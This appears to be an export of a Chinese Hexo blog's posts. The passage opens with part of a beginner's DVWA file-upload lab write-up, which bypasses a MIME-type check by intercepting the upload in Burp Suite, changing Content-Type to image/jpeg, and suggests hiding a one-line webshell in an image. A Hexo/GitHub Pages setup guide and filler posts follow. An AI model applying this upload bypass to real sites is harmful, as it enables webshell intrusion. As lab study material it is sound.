src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image12.png" alt="image12"></p><p>我们可以看到这里加了一段检测代码，只有文件的MIME类型为“image/jpeg”且文件大小小于100000字节时，文件才能上传成功。这说明我们再直接上传那段恶意代码就会被检测出来，导致上传不成功。</p><p>关于MIME类型可以自行百度，每一个文件都会有各自唯一的MIME类型。</p><p>我们可以在Ubuntu上安装Burpsuite,下载地址为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1kTiGgVP</span><br></pre></td></tr></table></figure><p>解压密码为freebuf</p><p>首先下来这个文件，Burpsuite需要java支持，因此先安装java环境，打开命令行输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install default-jre</span><br></pre></td></tr></table></figure><p>安装完成后解压文件，给BurpLoader.jar执行权限，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x BurpLoader.jar</span><br></pre></td></tr></table></figure><p>然后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar BurpLoader.jar</span><br></pre></td></tr></table></figure><p>便运行成功了，但为了更加简单的访问burpsuite我们进行如下操作，将burp复制到/opt/burpsuite目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv brup1.6 /opt/</span><br></pre></td></tr></table></figure><p>然后将brup的名字改为burpsuite</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv brup1.6/ burpsuite</span><br></pre></td></tr></table></figure><p>然后在/usr/bin/下创建文件burpsuite</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /usr/bin/burpsuite</span><br></pre></td></tr></table></figure><p>此时burpsuite无法写入和修改，我们修改它的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 burpsuite</span><br></pre></td></tr></table></figure><p>接下来编辑这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/bin/burpsuite</span><br></pre></td></tr></table></figure><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">java -jar /opt/burpsuite/BurpLoader.jar</span><br></pre></td></tr></table></figure><p>保存后，给这个文件执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/bin/burpsuite </span><br></pre></td></tr></table></figure><p>后面就可以直接在命令行输入burpsuite就可以直接打开这款软件了，安装完毕！</p><p>打开这款软件</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image13.png" alt="image13"></p><p>画圈处proxy为代理功能，<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image14.png" alt="image14"></p><p>点到设置，<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image15.png" alt="image15"></p><p>设置为All interfaces，这样所有机器都能用这台机器作为代理服务器，即外部机器将代理地址设为本机的IP地址后，每次的http(s)请求都要通过本机。</p><p>可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tnlp</span><br></pre></td></tr></table></figure><p>命令来查看端口打开状态，可见8080端口对所有机器都是打开状态</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image16.png" alt="image16"></p><p>此时默认的拦截服务是关闭状态</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image17.png" alt="image17"></p><p>我们将外部机器的火狐浏览器的代理地址改为这台机器的IP地址</p><p>按<strong>Alt</strong>键会出现<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image18.png" alt="image18"></p><p>点<strong>工具-&gt;选项</strong>，然后下拉至<strong>网络设置-&gt;设置</strong></p><p>设置好代理，地址为安装burpsuite机器的IP地址</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image19.png" alt="image19"></p><p>此时在设置好代理的机器上还能打开那个网页</p><p>我们将burpsuite的拦截服务打开</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image20.png" alt="image20"></p><p>这样设置好代理的机器上就不能打开那个网页了。但是我们此时上传这个恶意文件的话，文件就会被这个代理服务器拦截下来</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image21.png" alt="image21"></p><p>这里可见文件不是立即返回上传不成功，而是在加载，这时我们可以在burpsuite上看到这个文件</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image22.png" alt="image22"></p><p><em><strong>这里我们将Content-Type:application/octet-stream</strong></em></p><p>改为<em><strong>Content-Type:image/jpeg</strong></em></p><p>然后点击<em><strong>Forward</strong></em>上传，这时恶意文件就上传成功了！</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image23.png" alt="image23"></p><p>然后同low级别的操作就成功入侵靶机！</p><h3 id="文件上传漏洞渗透及防御的学习——安全级别为medium-1"><a href="#文件上传漏洞渗透及防御的学习——安全级别为medium-1" class="headerlink" title="文件上传漏洞渗透及防御的学习——安全级别为medium"></a>文件上传漏洞渗透及防御的学习——安全级别为medium</h3><p>将安全级别调至high，查看后端代码</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image24.png" alt="image24"></p><p>此时直接对文件的后缀进行了限制，我们无法再像第二步那样操作，因为我们必须得对文件后缀进行修改，这样会导致文件不可用。</p><p>可行方法：上传带有一句话木马程序的图片，即信息隐藏！</p><p>初步学习完毕！</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白，学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人博客的搭建——初步</title>
      <link href="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/"/>
      <url>/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="一-什么是Hexo"><a href="#一-什么是Hexo" class="headerlink" title="一.什么是Hexo?"></a>一.<strong>什么是Hexo?</strong></h2><p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客的首选框架。这里我选用的是GitHub作为我博客的服务器，搭建环境为<strong>Windows10</strong>，同时Hexo也是GitHub上的开源项目，可以参见<u>hexojs/hexo</u>。</p><p>搭建完毕后的个人博客地址:<a href="http://www.zymstudy.club/">www.zymstudy.club</a></p><h2 id="二-搭建大致步骤："><a href="#二-搭建大致步骤：" class="headerlink" title="二.搭建大致步骤："></a>二.<strong>搭建大致步骤：</strong></h2><ol><li><p>获得个人网站的域名</p></li><li><p>GitHub创建个人仓库</p></li><li><p>安装Git</p></li><li><p>安装Node.js</p></li><li><p>安装Hexo</p></li><li><p>推送网站</p></li><li><p>绑定域名</p></li><li><p>更换主题</p></li><li><p>熟悉MarkDown语法</p></li><li><p>发布文章</p></li><li><p>寻找图床</p></li><li><p>个性化设置</p></li><li><p>其他附录</p><h3 id="1-获得个人网站域名"><a href="#1-获得个人网站域名" class="headerlink" title="1.获得个人网站域名"></a>1.<strong>获得个人网站域名</strong></h3></li></ol><p>域名是网站的入口，也是网站的第一印象，比如饿了么官网的域名是<u>ele.me</u>,常见的域名后缀有com,cn,net,org等，也有一些比较少见的如xyz,me,io等，这些域名是我们自己申请的，由于大陆监管较为严格，因此一些比较少见的域名后缀在大陆是无法备案的，因此网站也无法上线。但是使用GitHub来作为服务器来托管我们自己的网站是不需要备案的，因为GitHub是国外项目，这样托管我们网站内容的服务器在美国，就不需要在大陆备案。</p><p>申请域名的地方有很多，比如阿里云、腾讯云和百度云等等。我这个个人博客的网站域名是在腾讯云那里购买的，腾讯云地址：<a href="https://cloud.tencent.com/%E3%80%82">https://cloud.tencent.com/。</a></p><h3 id="2-GitHub创建个人仓库"><a href="#2-GitHub创建个人仓库" class="headerlink" title="2.GitHub创建个人仓库"></a><strong>2.GitHub创建个人仓库</strong></h3><p>登录到GitHub，创建个人GitHub账号，然后点击GitHub的New repository来创建新仓库，此处仓库命名规则：<strong>用户名.github.io</strong>，这里用户名是你的github账号名称，比如我这里的仓库名为：<strong>zym1290190720.github.io</strong></p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image1.png" alt="image1"></p><h3 id="3-安装Git"><a href="#3-安装Git" class="headerlink" title="3.安装Git"></a><strong>3.安装Git</strong></h3><p>什么是Git?简单来说Git是开源的分布式版本控制系统，用于敏捷高效地处理项目。我们网站在本地搭建好了，需要使用Git同步到GitHub上。如果想要了解Git的细节，可以参看<a href="https://weibo.com/liaoxuefeng">廖雪峰</a>老师的Git教程：<a href="https://www.liaoxuefeng.com/wiki/896043488029600">Git教程</a>。</p><p>Git从官网上下载:<a href="https://git-scm.com/download/win">Git-Downloading Package</a>。选择64位的安装包，下载后安装，然后可以在命令行里测试git是否安装成功：<code>git --version</code>，安装成功的话会显示版本号，比如我这里：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image2.png" alt="image2"></p><p>若安装失败，请自行参考其他详细的Git安装教程，安装成功后，将自己的Git与GitHub账号绑定，鼠标右键打开Git Bash</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/.%5C%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5%5Cimage3.png" alt="image3"></p><p>（这里截图的方式：鼠标右键呼出菜单栏，鼠标左键按住某个选项，再Ctrl+shift+A即可）</p><p><strong>进入设置user.name和user.email配置信息:</strong></p><p><code>git config --global user.name &quot;你的GitHub用户名&quot;</code></p><p><code>git config --global user.email &quot;你的GitHub注册邮箱&quot;</code></p><p><strong>生成ssh密钥文件：</strong></p><p><code>ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot;</code></p><p>输入后直接按三个回车键，默认的不需要设置密码</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image4.png" alt="image4"></p><p>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image5.png" alt="image5"></p><p>打开GitHub的Settings-SSH and GPG keys-New SSH key</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image1.png" alt="image6"></p><p>点击Add SSH key，可以在Git Bash窗口中检测GitHub公钥设置是否成功，输入</p><p><code>ssh git@github.com</code></p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image7.png" alt="image7"></p><p>出现Hi github账号名，说明设置成功！</p><p>这里之所以设置GitHub密钥原因是，通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。</p><h3 id="4-安装Node-js"><a href="#4-安装Node-js" class="headerlink" title="4.安装Node.js"></a><strong>4.安装Node.js</strong></h3><p>Hexo基于Node.js，Node.js的下载地址：<a href="https://nodejs.org/en/download/">Download|Node.js</a>，注意安装Node.js会包含环境变量及npm的安装，安装后，检测Node.js是否安装成功，在命令行输入<code>node -v</code></p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image8.png" alt="image8"></p><p>检测npm是否安装成功，在命令行输入<code>npm -v</code></p><p>至此，安装Hexo的环境已经全部搭建完成！</p><h3 id="5-安装Hexo"><a href="#5-安装Hexo" class="headerlink" title="5.安装Hexo"></a><strong>5.安装Hexo</strong></h3><p>Hexo就是我们的个人博客网站的框架， 这里需要自己在电脑常里创建一个文件夹，可以命名为blog，比如我在D盘新建文件夹blog，Hexo框架与以后你自己发布的网页都在这个文件夹中。创建好后，进入文件夹中，按住shift键，右击鼠标点击命令行。</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image9.png" alt="image9"></p><p>使用npm命令安装Hexo，输入：<code>npm install -g hexo-cli</code></p><p>安装时间较长，安装完成后，初始化我们的博客，输入：<code>hexo init blog</code></p><p>注意，这里的命令都是作用在刚刚创建的blog文件夹中。</p><p>为了检测我的网站雏形，分别按顺序输入以下三条命令：</p><p><code>hexo new test_my_site</code></p><p><code>hexo g</code></p><p><code>hexo s</code></p><p>这些命令在后面作介绍，完成后，打开浏览器输入地址：</p><p><code>127.0.0.1:4000</code></p><p>就能看到我们的网站雏形。</p><p><strong>现在来介绍常用的Hexo 命令</strong></p><p><code>npm install hexo -g #安装Hexo</code><br><code>npm update hexo -g #升级</code><br><code>hexo init #初始化博客</code></p><p><strong>命令简写</strong><br><code>hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</code><br><code>hexo g == hexo generate #生成</code><br><code>hexo s == hexo server #启动服务预览</code><br><code>hexo d == hexo deploy #部署</code></p><p><code>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</code><br><code>hexo server -s #静态模式</code><br><code>hexo server -p 5000 #更改端口</code><br><code>hexo server -i 192.168.1.1 #自定义 IP</code><br><code>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</code></p><p>刚刚的三个命令依次是新建一篇博客文章、生成网页、在本地预览的操作。</p><h3 id="6-推送网站"><a href="#6-推送网站" class="headerlink" title="6.推送网站"></a><strong>6.推送网站</strong></h3><p>上面只是在本地预览，接下来要做的就是就是推送网站，也就是发布网站，让我们的网站可以被更多的人访问。在设置之前，需要解释一个概念，在blog根目录里的_config.yml文件称为<strong>站点配置文件</strong>，如下图</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image10.png" alt="image10"></p><p>进入根目录里的themes文件夹，里面也有个_config.yml文件，这个称为<strong>主题配置文件</strong>，如下图</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image11.png" alt="image11"></p><p>（注意，我这里是安装了next主题样式，所以会出现next的文件夹）</p><p>下一步将我们的Hexo与GitHub关联起来，打开<strong>站点配置文件</strong>，翻到最后修改为：</p><p>deploy:<br>type: git<br>repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git<br>branch: main</p><p>参考如下：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image12.png" alt="image12"></p><p>保存站点配置文件。</p><p>其实就是给hexo d 这个命令做相应的配置，让hexo知道你要把blog部署在哪个位置，很显然，我们部署在我们GitHub的仓库里。最后安装Git部署插件，输入命令：</p><p><code>npm install hexo-deployer-git --save</code></p><p>这时，我们分别输入三条命令：</p><p><code>hexo clean</code></p><p><code>hexo g</code></p><p><code>hexo d</code></p><p>其实第三条的 hexo d 就是部署网站命令，d是deploy的缩写。完成后，打开浏览器，在地址栏输入你的放置个人网站的仓库路径，即xxx.github.io比如我的xxx就是我的GitHub用户名。</p><p>你就会发现你的博客已经上线了，可以在网络上访问了。</p><h3 id="7-绑定域名"><a href="#7-绑定域名" class="headerlink" title="7.绑定域名"></a><strong>7.绑定域名</strong></h3><p>此时GitHub绑定完成后，我们可以在网上输入zym1290190720.github.io来访问我们的个人博客，但这个域名看起来很傻且难记，于是我们可以去某云上去购买一个自己的域名，我这里是在腾讯云上购买了一个域名：zymstudy.club</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image14.png" alt="image14"></p><p>然后进行域名解析，定向到自己的github仓库地址。</p><p>接着登录GitHub，设置Custom domain，输入自己的域名</p><p>最后进入本地博客文件夹 ，进入blog/source目录下，创建一个记事本文件，输入你的域名，对，只要写进你自己的域名即可。如果带有www，那么以后访问的时候必须带有www完整的域名才可以访问，但如果不带有www，以后访问的时候带不带www都可以访问。所以建议，不要带有www。</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image15.png" alt="image15"></p><h3 id="8-更换主题"><a href="#8-更换主题" class="headerlink" title="8.更换主题"></a><strong>8.更换主题</strong></h3><p>如果你不喜欢Hexo默认的主题，可以更换不同的主题，可以在blog目录中的themes文件夹中查看你自己主题是什么。现在把默认主题更改成Next主题，在blog目录中（就是命令行的位置处于blog目录）打开命令行输入：</p><p><code>git clone https://github.com/iissnan/hexo-theme-next themes/next</code></p><p>这是将Next主题下载到blog目录的themes主题下的next文件夹中。</p><p>打开<strong>站点配置文件</strong>，修改主题为next</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image16.png" alt="image16"></p><p>然后打开<strong>主题配置文件</strong>，找到Scheme Settings</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image17.png" alt="image17"></p><p>next主题有四个样式，我用的是Gemini，你们可以自己试试看，选择你自己喜欢的样式（只需要把行首的#去除，#是注释），选择好后，再次部署网站，hexo g、hexo d，查看效果。选择其他主题，按照上述过程即可实现。</p><h3 id="9-初识Markdown语法"><a href="#9-初识Markdown语法" class="headerlink" title="9.初识Markdown语法"></a><strong>9.初识Markdown语法</strong></h3><p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Markdown语法简洁明了、容易掌握，而且功能比纯文本更强，因此写博客使用它，可以让用户更加专注的写文章，而不需要费尽心力的考虑样式，相对于html已经算是轻量级语言，像有道云笔记也支持Markdown写作。并且Markdown完全兼容html，也就是可以在文章里直接插入html代码。比如给博文添加音乐，就可以直接把音乐的外链html代码插入文章中。具体语法参看：<a href="https://link.zhihu.com/?target=http://www.appinn.com/markdown/">Markdown 语法说明(简体中文版)</a> 可以说十分钟就可以入门。当然，工欲善其事必先利其器，选择一个好的Markdown编辑器也是非常重要的，这里推荐<a href="https://link.zhihu.com/?target=http://code52.org/DownmarkerWPF/">MarkPad</a> 和<a href="https://link.zhihu.com/?target=http://www.markdownpad.com/">The Markdown Editor for Windows</a> ，这是带有预览效果的编辑器，也可以使用本地的文本编辑器，更多的Markdown的语法与编辑器自己可以搜索了解。</p><h3 id="10-发布文章"><a href="#10-发布文章" class="headerlink" title="10.发布文章"></a><strong>10.发布文章</strong></h3><p>进入Git Bash界面，输入命令：<code>hexo n 文章名</code></p><p>这样会在blog/source/_posts下面生成文章名.md和一个文章名的文件夹</p><p>我们在md文件里面就可以编写自己的文章了</p><p><strong>注意，这里加载图片有坑！</strong></p><p>由于我们是在md文件里面编写，因此这篇文章需要使用markdown语法文章，在文章中插入本地图片需要遵循markdown的语法，很有可能遇到使用绝对路径和相对路径，再部署到github上面图片无法显示的情况。</p><p><strong>解决办法：</strong></p><p>先安装插件，打开Git Bash界面，输入命令</p><p><code>npm install hexo-asset-image --save</code></p><p>安装第三方插件hexo-asset-image</p><p>然后修改<strong>站点配置文件</strong>，修改里面的post_asset+folder的值为true</p><p>新建文章，在文章名的文件夹里面放入要插入的图片，然后在md文件中引用该文件夹的图片，markdown插入图片的语法为<img src>，圆括号中的地址为同名文件夹中图片的文件名。</p><p>举例如下：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image13.png" alt="image13"></p><h3 id="11-寻找图床"><a href="#11-寻找图床" class="headerlink" title="11.寻找图床"></a><strong>11.寻找图床</strong></h3><p>图床，当博文中有图片时，若是少量图片，可以直接把图片存放在source文件夹中，但这显然不合理的，因为图片会占据大量的存储的空间，加载的时候相对缓慢 ，这时考虑把博文里的图片上传到某一网站，然后获得外部链接，使用Markdown语法，/<strong><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/%E5%A4%96%E9%83%A8%E9%93%BE%E6%8E%A5" alt="图片信息"></strong>/ 完成图片的插入，这种网站就被成为图床。常见的简易的图床网站有：<a href="https://link.zhihu.com/?target=http://www.tietuku.com/">贴图库图片外链</a> 国内算比较好的图床我认为有两个：新浪微博和 <a href="https://link.zhihu.com/?target=https://www.qiniu.com/">七牛云</a> ，七牛云的使用方法可以参看其他文章。图床最重要的就是稳定速度快，所以在挑选图床的时候一定要仔细，下图是博文插入图片，使用图床外链的示例：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image18.jpg" alt="image18"></p><h3 id="12-个性化设置"><a href="#12-个性化设置" class="headerlink" title="12.个性化设置"></a><strong>12.个性化设置</strong></h3><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image19.png" alt="image19"></p><p>依次是网站标题、副标题、网站描述、作者、网站头像外部链接、网站语言、时区等。</p><h1 id="问题1-hexo用法一直弹出hexo-help"><a href="#问题1-hexo用法一直弹出hexo-help" class="headerlink" title="问题1:hexo用法一直弹出hexo help"></a>问题1:hexo用法一直弹出hexo help</h1><p>问题出处：</p><p>由于启动hexo s后，打开本地博客界面，一直弹出问题：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image20.png" alt="image20"></p><p>于是我去网上找教程，看到教程<a href="https://www.haoyizebo.com/posts/710984d0/">https://www.haoyizebo.com/posts/710984d0/</a></p><p>其中解决方法1是降级node</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image21.png" alt="image21"></p><p>brew是基于Mac的下载命令，我是Windows换的npm命令，但敲完后出现大问题！我的git bash无法执行hexo命令了！</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image22.png" alt="image22"></p><p>于是我进到D:\blog\node_modules.bin\node文件，发现是目录指向错误。</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image23.png" alt="image23"></p><p>然后我查看了其他人创建的hexo 博客目录，发现他们根本都没有node_modules.bin\node文件，于是我认为一定是在对node进行版本变更时windows系统给node做了一定的改动，增加了node_modules.bin\node文件（我猜的），因此我直接将这个文件删除，重新执行hexo命令，出现我现在这个问题，hexo命令失效！除了能查看hexo -v版本号，其他hexo命令全部弹出hexo用法的提示！</p><p>找遍网上各种教程依然无法解决，于是我查看了hexo的目录结构，发现package.json中没有hexo的信息标识，</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image24.png" alt="image24"></p><p>于是我往里面加入</p><p>  ``”hexo”: {<code>     </code>“version”: “5.4.0”<code>   &#125;,</code></p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image25.png" alt="image25"></p><p>重新输入hexo命令，成功！</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image26.png" alt="image26"></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白，学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>my first post</title>
      <link href="/2021/10/20/my-first-post/"/>
      <url>/2021/10/20/my-first-post/</url>
      
        <content type="html"><![CDATA[<p>asdasdasd<a href="https://zym1290190720.github.io/">https://zym1290190720.github.io/</a>****</p><p><strong>asdas</strong>d</p><p>asdasdasd</p><p>asda</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/10/20/hello-world/"/>
      <url>/2021/10/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a 